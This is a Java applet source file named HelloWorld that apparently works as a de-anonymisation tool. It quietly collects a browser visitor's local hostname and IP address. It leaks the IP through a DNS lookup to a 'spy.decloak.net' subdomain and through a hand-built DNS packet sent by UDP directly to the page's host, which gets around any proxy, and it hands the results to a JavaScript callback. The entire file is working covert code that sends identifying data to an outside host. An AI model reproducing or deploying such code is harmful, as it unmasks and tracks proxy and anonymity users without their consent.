import java.applet.*;
import java.awt.*;
import java.net.*;
import java.math.*;
import java.io.*;
import java.util.*;
import netscape.javascript.*;

public class HelloWorld extends Applet implements Runnable {

	public String error;
	public String rhost;
	public String lhost;
	public String laddr;
	public String dhost;
	public int rport;
	public int lport;
	public int uport;
	public JSObject win;
	ByteArrayOutputStream buff;
	int width, height;
	Thread t;
		
	private void h(String data) 
	{
		BigInteger bi;
		bi = new BigInteger(data, 16);
		try {
			buff.write( bi.toByteArray() );
		} catch (Exception e){ }
	}
	
	private void a(String data) 
	{
		try {
			buff.write( data.getBytes() );
		} catch (Exception e){ }
	}	
	
	private void sendUDP(byte[] buffer) 
	{
		InetAddress address;
		DatagramSocket socket = null; 
		DatagramPacket packet;

		try { 
			socket = new DatagramSocket(); 
			address = InetAddress.getByName(rhost);
			packet = new DatagramPacket(buffer, buffer.length, address, uport);
			socket.send(packet);
		} catch(Exception e) { 
			socket.close();
			error = "UDP: " + e.toString();
			return;
		}
		
		socket.close();
		return;
	}
	
    private void gatherInfo()
    {
        rhost = getDocumentBase().getHost();
        rport = getDocumentBase().getPort();
		
		if (rport == -1)
			rport = 80;
			
        try {
            lhost = (new Socket(rhost, rport)).getLocalAddress().getHostName();
        } catch(Exception e) { error = e.toString(); }
			

		try {
			laddr = (new Socket(rhost, rport)).getLocalAddress().getHostAddress();
		} catch (Exception e) { error = e.toString(); }
	}

	public void init() {
		t = new Thread(this);
		t.start();
	}
	
	// the background thread
	public void run() {

		String callback = getParameter("Callback");
		String external = getParameter("External");
		String clientid = getParameter("ClientID");
		String dnshost  = "unknown";
		
		width = getSize().width;
		height = getSize().height;
		setBackground( Color.black );

		uport = Integer.parseInt(getParameter("UDPPort"));

		win = (JSObject) JSObject.getWindow(this);
					
		gatherInfo();


		/* The following call results in a security exception... after its run :-) */
		try {
			InetAddress dns = InetAddress.getByName(
				clientid + "." +
				"java"   + "." +
				external + "." +
				laddr + "." +
				"spy" + ".decloak.net"
			);

		} catch(Exception e) {  }
		

		buff = new ByteArrayOutputStream();
		byte xid[] = "XX".getBytes();
		
		Random rand = new Random(new Date().getTime());
		rand.nextBytes(xid);
		
		try { buff.write(xid); } catch (Exception e) {}
	
		h("01000001000000000000");
		h("20"); a(clientid);
		h("03"); a("udp");
		h("0130013001300130");
		h("0130013001300130");
		h("03"); a("spy");
		h("07"); a("decloak");
		h("03"); a("net"); 
		h("00");
		h("00");
		h("01");
		h("00");
		h("01");

		sendUDP(buff.toByteArray());
		
		if(callback != null) {
			
            String args[] = {
                rhost,
				lhost,
				laddr,
				external,
				dhost
            };

			win.call(callback, args);	
		}
	}
	

}
